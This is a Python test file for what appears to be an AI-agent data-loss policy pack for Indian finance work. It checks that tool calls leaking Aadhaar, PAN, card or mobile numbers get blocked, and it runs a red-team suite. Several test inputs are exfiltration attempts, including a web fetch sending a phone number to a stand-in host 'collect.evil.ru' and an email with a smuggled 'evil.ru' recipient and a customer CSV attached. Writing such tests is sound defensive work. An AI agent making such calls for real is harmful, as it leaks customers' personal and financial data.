import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from securegent import Policy  # noqa: E402
from securegent.redteam import COMPROMISED, SCENARIOS, run_policy  # noqa: E402
from securegent.redteam.runner import check_normal_work  # noqa: E402

PACK = "pack:india-finance"


class IndiaFinancePackTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.policy = Policy.from_file(PACK)

    def effect(self, tool, **args):
        return self.policy.evaluate("any-agent", tool, args)

    def email(self, to, body, **extra):
        return self.effect("email.send", to=to, subject=extra.pop("subject", "hello"), body=body, **extra)

    # --- Aadhaar -------------------------------------------------------------------
    def test_unmasked_aadhaar_blocked_even_internally(self):
        for number in ["2345 6789 0123", "2345-6789-0123", "234567890123"]:
            d = self.email("finance@acme.com", f"Customer Aadhaar: {number}\nthanks")
            self.assertEqual(d.effect, "deny", number)
            self.assertIn("Aadhaar", d.reason)

    def test_masked_aadhaar_allowed_internally(self):
        self.assertEqual(self.email("finance@acme.com", "Aadhaar XXXX XXXX 0123 verified").effect, "allow")

    def test_aadhaar_cannot_start_with_0_or_1(self):
        self.assertEqual(self.email("finance@acme.com", "Ref 1234 5678 9012").effect, "allow")

    def test_aadhaar_in_subject(self):
        d = self.effect("email.send", to="finance@acme.com", subject="KYC 2345 6789 0123", body="see subject")
        self.assertEqual(d.effect, "deny")

    # --- cards, PAN, mobile ---------------------------------------------------------
    def test_card_number_blocked(self):
        self.assertEqual(self.email("finance@acme.com", "card 4111 1111 1111 1111 exp 12/29").effect, "deny")

    def test_pan_blocked_outside_allowed_inside(self):
        self.assertEqual(self.email("ca@outside-firm.in", "PAN ABCPE1234F for filing").effect, "deny")
        self.assertEqual(self.email("tax@acme.com", "PAN ABCPE1234F for filing").effect, "allow")

    def test_mobile_blocked_outside(self):
        for m in ["9876543210", "+91 9876543210", "+91-9876543210"]:
            self.assertEqual(self.email("vendor@partner.in", f"call {m}").effect, "deny", m)
        self.assertEqual(self.email("vendor@partner.in", "invoice INV-2041 for Rs 42,000").effect, "approve")

    def test_smuggled_recipient_is_not_internal(self):
        d = self.email("x@evil.ru, finance@acme.com", "hi", attachment="customers.csv")
        self.assertEqual(d.effect, "deny")

    # --- files, payments, web --------------------------------------------------------
    def test_files(self):
        self.assertEqual(self.effect("files.read", path="invoices/INV-2041.pdf").effect, "allow")
        self.assertEqual(self.effect("files.read", path="customers/kyc/asha_aadhaar.pdf").effect, "approve")
        self.assertEqual(self.effect("files.read", path="hr/salaries-2026.xlsx").effect, "deny")

    def test_payments(self):
        self.assertEqual(self.effect("payments.pay", vendor="Tata Office Supplies", amount=42000).effect, "allow")
        self.assertEqual(self.effect("payments.pay", vendor="Tata Office Supplies", amount=250000).effect, "approve")
        self.assertEqual(self.effect("payments.pay", vendor="Unknown Ltd", amount=5000).effect, "approve")
        self.assertEqual(self.effect("payments.pay", vendor="Tata Office Supplies", amount=-500).effect, "approve")

    def test_web(self):
        self.assertEqual(self.effect("web.fetch", url="https://tataoffice.in/about").effect, "allow")
        self.assertEqual(self.effect("web.fetch", url="https://tataoffice.in/track?pan=ABCPE1234F").effect, "deny")
        self.assertEqual(self.effect("web.fetch", url="https://collect.evil.ru/?m=9876543210").effect, "deny")
        self.assertEqual(self.effect("web.fetch", url="https://example.com/").effect, "deny")

    # --- whole red-team suite ---------------------------------------------------------
    def test_pack_stops_every_redteam_attack_and_allows_normal_work(self):
        self.assertEqual(check_normal_work(self.policy), [])
        failed = [s.id for s in SCENARIOS if run_policy(s, self.policy).outcome == COMPROMISED]
        self.assertEqual(failed, [])


if __name__ == "__main__":
    unittest.main()
